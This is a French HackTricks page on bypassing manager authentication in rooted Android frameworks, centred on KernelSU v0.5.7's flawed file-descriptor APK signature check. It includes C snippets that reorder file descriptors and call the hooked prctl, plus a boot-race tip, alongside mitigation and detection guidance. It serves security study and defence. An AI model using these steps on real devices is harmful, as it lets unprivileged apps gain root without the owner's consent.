# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

Les rooting frameworks comme KernelSU, APatch, SKRoot et Magisk patchent fréquemment le kernel Linux/Android et exposent des fonctionnalités privilégiées à une application userspace « manager » non privilégiée via un syscall hooké. Si l’étape d’authentification du manager est défectueuse, n’importe quelle application locale peut accéder à ce canal et escalader ses privilèges sur les appareils déjà rootés.

Cette page résume les techniques et les pièges identifiés dans des recherches publiques, notamment l’analyse de Zimperium de KernelSU v0.5.7, afin d’aider les équipes red et blue à comprendre les surfaces d’attaque, les primitives d’exploitation et les mesures d’atténuation robustes.

---
## Modèle d’architecture : canal manager hooké sur un syscall

- Un module/patch kernel hooke un syscall, généralement prctl, pour recevoir des « commandes » depuis le userspace.
- Le protocole est généralement : magic_value, command_id, arg_ptr/len ...
- Une application userspace manager s’authentifie d’abord, par exemple avec CMD_BECOME_MANAGER. Une fois que le kernel a marqué l’appelant comme manager de confiance, les commandes privilégiées sont acceptées :
- Accorder les privilèges root à l’appelant, par exemple CMD_GRANT_ROOT
- Gérer les allowlists/deny-lists pour su
- Ajuster la politique SELinux, par exemple CMD_SET_SEPOLICY
- Interroger la version/configuration
- Comme toute application peut invoquer des syscalls, la fiabilité de l’authentification du manager est essentielle.

Exemple, conception de KernelSU :
- Syscall hooké : prctl
- Magic value utilisée pour rediriger vers le handler KernelSU : 0xDEADBEEF
- Les commandes incluent : CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, etc.

---
## Flux d’authentification de KernelSU v0.5.7, tel qu’implémenté

Lorsque le userspace appelle prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), KernelSU vérifie :

1) Vérification du préfixe du chemin
- Le chemin fourni doit commencer par un préfixe attendu pour l’UID de l’appelant, par exemple /data/data/<pkg> ou /data/user/<id>/<pkg>.
- Référence : logique de vérification du préfixe du chemin dans core_hook.c, v0.5.7.

2) Vérification de la propriété
- Le chemin doit appartenir à l’UID de l’appelant.
- Référence : logique de vérification de la propriété dans core_hook.c, v0.5.7.

3) Vérification de la signature de l’APK via un scan de la table des FD
- Parcourir les descripteurs de fichiers ouverts du processus appelant.
- Sélectionner le premier fichier dont le chemin correspond à /data/app/*/base.apk.
- Analyser la signature APK v2 et la vérifier par rapport au certificat officiel du manager.
- Références : manager.c, pour l’itération des FDs, et apk_sign.c, pour la vérification APK v2.

Si toutes les vérifications réussissent, le kernel met temporairement en cache l’UID du manager et accepte les commandes privilégiées provenant de cet UID jusqu’à sa réinitialisation.

---
## Classe de vulnérabilité : faire confiance au « premier APK correspondant » lors de l’itération des FD

Si la vérification de signature est liée au « premier /data/app/*/base.apk correspondant » trouvé dans la table des FD du processus, elle ne vérifie en réalité pas le package de l’appelant. Un attaquant peut prépositionner un APK légitimement signé, celui du véritable manager, afin qu’il apparaisse plus tôt dans la liste des FD que son propre base.apk.

Cette confiance indirecte permet à une application non privilégiée d’usurper l’identité du manager sans posséder sa clé de signature.

Propriétés exploitées :
- Le scan des FD n’est pas lié à l’identité du package appelant ; il effectue uniquement une correspondance de chaînes de chemin.
- open() renvoie le FD disponible portant le plus petit numéro. En fermant d’abord les FD portant les numéros les plus bas, un attaquant peut contrôler l’ordre.
- Le filtre vérifie uniquement que le chemin correspond à /data/app/*/base.apk, et non qu’il correspond au package installé de l’appelant.

---
## Prérequis de l’attaque

- L’appareil est déjà rooté avec un rooting framework vulnérable, par exemple KernelSU v0.5.7.
- L’attaquant peut exécuter localement du code arbitraire non privilégié, dans le processus d’une application Android.
- Le véritable manager ne s’est pas encore authentifié, par exemple juste après un reboot. Certains frameworks mettent en cache l’UID du manager après une authentification réussie ; il faut gagner la race.

---
## Schéma d’exploitation, KernelSU v0.5.7

Étapes générales :
1) Construire un chemin valide vers le répertoire de données de sa propre application afin de satisfaire les vérifications du préfixe et de la propriété.
2) S’assurer qu’un véritable base.apk de KernelSU Manager est ouvert sur un FD portant un numéro inférieur à celui de son propre base.apk.
3) Invoquer prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) afin de passer les vérifications.
4) Émettre des commandes privilégiées comme CMD_GRANT_ROOT, CMD_ALLOW_SU et CMD_SET_SEPOLICY afin de faire persister l’élévation.

Notes pratiques concernant l’étape 2, l’ordre des FD :
- Identifier le FD de son processus correspondant à son propre /data/app/*/base.apk en parcourant les liens symboliques /proc/self/fd.
- Fermer un FD de faible numéro, par exemple stdin, fd 0, puis ouvrir d’abord l’APK légitime du manager afin qu’il occupe le fd 0, ou tout autre index inférieur à celui du FD de son propre base.apk.
- Intégrer l’APK légitime du manager à son application afin que son chemin satisfasse le filtre naïf du kernel. Par exemple, le placer sous un sous-chemin correspondant à /data/app/*/base.apk.

Exemples d’extraits de code, Android/Linux, fournis uniquement à titre illustratif :

Énumérer les FD ouverts afin de localiser les entrées base.apk :
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Forcer un FD de numéro inférieur à pointer vers l'APK légitime du manager :
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Authentification de Manager via un hook prctl :
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
Après réussite, commandes privilégiées (exemples) :
- CMD_GRANT_ROOT: promouvoir le processus actuel en root
- CMD_ALLOW_SU: ajouter votre package/UID à l’allowlist pour un su persistant
- CMD_SET_SEPOLICY: ajuster la policy SELinux comme le framework le permet

Conseil de race/persistance :
- Enregistrer un receiver BOOT_COMPLETED dans AndroidManifest (RECEIVE_BOOT_COMPLETED) pour démarrer rapidement après le reboot et tenter l’authentification avant le manager légitime.

---
## Conseils de détection et de mitigation

Pour les développeurs de frameworks :
- Lier l’authentification au package/UID de l’appelant, et non à des FDs arbitraires :
- Résoudre le package de l’appelant à partir de son UID et le vérifier par rapport à la signature du package installé (via PackageManager), plutôt que de parcourir les FDs.
- Si l’approche est uniquement kernel, utiliser une identité stable de l’appelant (task creds) et valider à partir d’une source de vérité stable gérée par init/helper userspace, et non par les FDs du processus.
- Éviter les vérifications de préfixe de chemin comme identité ; elles peuvent être trivialement satisfaites par l’appelant.
- Utiliser un challenge–response basé sur un nonce via le channel et effacer toute identité de manager mise en cache au boot ou lors d’événements clés.
- Envisager une IPC authentifiée basée sur Binder plutôt que de surcharger des syscalls génériques lorsque cela est possible.

Pour les defenders/blue team :
- Détecter la présence de rooting frameworks et de processus de manager ; surveiller les appels prctl avec des magic constants suspectes (par exemple 0xDEADBEEF) si vous disposez de télémétrie kernel.
- Sur les flottes managed, bloquer ou déclencher une alerte pour les boot receivers provenant de packages non approuvés qui tentent rapidement des commandes privilégiées du manager après le boot.
- Vérifier que les appareils utilisent des versions patchées du framework ; invalider les IDs de manager mis en cache lors d’une mise à jour.

Limitations de l’attaque :
- N’affecte que les appareils déjà rooted avec un framework vulnérable.
- Nécessite généralement un reboot/une fenêtre de race avant que le manager légitime ne s’authentifie (certains frameworks mettent en cache l’UID du manager jusqu’à sa réinitialisation).

---
## Notes associées entre les frameworks

- L’authentification basée sur un mot de passe (par exemple, les builds historiques d’APatch/SKRoot) peut être faible si les mots de passe sont devinables ou peuvent faire l’objet de bruteforce, ou si les validations comportent des bugs.
- L’authentification basée sur le package/la signature (par exemple, KernelSU) est plus robuste en principe, mais doit être liée à l’appelant réel, et non à des artefacts indirects comme les scans de FD.
- Magisk: CVE-2024-48336 (MagiskEoP) a montré que même des écosystèmes matures peuvent être vulnérables à l’usurpation d’identité, permettant une code execution avec root dans le contexte du manager.

---
## Références

- [Zimperium – The Rooting of All Evil: Security Holes That Could Compromise Your Mobile Device](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [KernelSU v0.5.7 – core_hook.c path checks (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [KernelSU v0.5.7 – manager.c FD iteration/signature check (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [KernelSU – apk_sign.c APK v2 verification (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [KernelSU project](https://kernelsu.org/)
- [APatch](https://github.com/bmax121/APatch)
- [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
